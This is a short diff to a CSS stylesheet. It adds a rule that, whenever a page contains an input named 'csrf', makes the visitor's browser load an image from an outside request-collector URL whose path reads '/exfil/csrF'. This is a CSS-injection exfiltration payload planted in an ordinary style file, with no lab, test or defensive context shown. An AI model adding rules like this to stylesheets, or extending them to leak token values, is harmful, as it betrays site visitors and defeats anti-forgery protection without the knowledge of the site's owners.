@@ -2,3 +2,6 @@ body {
      background-color: blue;
 }
 
+input[name=csrf] ~ * {
+    background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/exfil/csrF);
+}
